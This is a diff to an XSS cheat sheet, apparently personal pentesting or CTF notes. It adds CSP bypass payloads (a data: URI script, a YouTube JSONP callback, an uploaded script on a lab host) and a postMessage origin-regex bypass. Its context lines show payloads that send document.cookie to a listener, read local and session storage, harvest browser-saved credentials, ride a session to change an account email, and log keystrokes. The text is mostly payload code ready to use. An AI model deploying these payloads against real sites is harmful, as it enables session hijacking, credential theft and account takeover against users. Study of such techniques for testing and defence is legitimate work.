@@ -50,8 +50,84 @@ tags:
 		- Reporting a post or user
 		- etc.
 
+## Content Security Policy
 
-## Building Requests
+CSP is a secondary protection mechanism that helps protect against XSS, Clickjacking, and other types of attacks. 
+
+### CSP Bypasses
+
+#### CSP URI Scheme Bypass
+
+May be able to use something like data.
+
+Example:
+
+```html title="data bypass"
+<script src=data:text/javascript,alert(1)></script>
+```
+
+```html title="data bypass in an object tag"
+<object data="data:text/html,<script>alert(1)</script>"></object>
+```
+
+#### CSP JSONP Bypass
+
+JSON with padding.
+
+Allows an application to retrieve JSON data from another domain.
+
+We can abuse the callback function. Example:
+
+```html title="YouTube JSONP bypass"
+<script src=https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=mCn54oGQH0w&callback=alert(1)></script>
+```
+
+#### CSP Upload Bypass
+
+If we can find a way to upload a script to the same domain, then it will bypass a `script-src: self` directive. 
+
+Check if `.js` files are allowed on any upload form. 
+
+Example:
+
+```html title="Example upload CSP bypass"
+Test message<script src=https://z2c8lw3i.eu4.ctfio.com/csp-upload/uploads/ac27121ae671cfeb22e3eb472e0e1997.js></script>
+```
+
+## PostMessage
+
+A way for different browser windows to be able to talk to each other. 
+
+- [ ] Check that postmessage orgin is validated
+- [ ] Check for misconfigured regex
+
+Example:
+
+```html title="Misconfigured regex"
+<script>
+	window.addEventListener("message",function(event){
+		if (event.data.hasOwnProperty('msg')) {
+			if( /(http:|https:)\/\/([a-z0-9.]{1,}).ctfio.com/.test( event.origin ) ) {
+				document.getElementById('message').innerHTML = event.data.msg;
+			}else{
+				alert("You're not allowed to send from here!");
+			}
+		}
+	});
+    </script>
+```
+
+Note the mistake in the regex. The `.` character matches any character except for line separators. This allows us to register a domain like eviltestctfio.com that would bypass this check. 
+
+https://regex101.com
+
+![](attachments/xss-cheatsheet/file-20251119150122338.png)
+
+Additionally, there's nothing to indicate that the `ctfio.com` is the end of the string, so something like `test.ctfio.com.hacker.com` would also work.
+
+
+## Payloads
+### Building Requests
 
 ```js title="XMLHTTP Request"
 let xhr = new XMLHttpRequest()
@@ -63,7 +139,7 @@ xhr.send('email=update@email.com’)
 fetch('http://localhost/endpoint’)
 ```
 
-## Stealing Cookies
+### Stealing Cookies
 
 ```js title="Using img src"
 <img src="http://localhost?c='+document.cookie+'" />
@@ -73,7 +149,7 @@ fetch('http://localhost/endpoint’)
 fetch("http://localhost?c=" + document.cookie);
 ```
 
-## Accessing Local & Session Storage
+### Accessing Local & Session Storage
 
 ```js title="Local storage"
 let localStorageData = JSON.stringify(localStorage);
@@ -83,7 +159,7 @@ let localStorageData = JSON.stringify(localStorage);
 let sessionStorageData = JSON.stringify(sessionStorage);
 ```
 
-## Saved Credentials
+### Saved Credentials
 
 ```js title="Saved creds"
 // create the input elements
@@ -108,7 +184,7 @@ setTimeout(function () {
 }, 1000);
 ```
 
-## Session Riding
+### Session Riding
 
 ```js title="Session riding"
 let xhr = new XMLHttpRequest();
@@ -117,7 +193,7 @@ xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
 xhr.send('email=updated@email.com’);
 ```
 
-## Keylogging
+### Keylogging
 
 ```js title="JS Keylogger"
 document.onkeypress = function (e) {
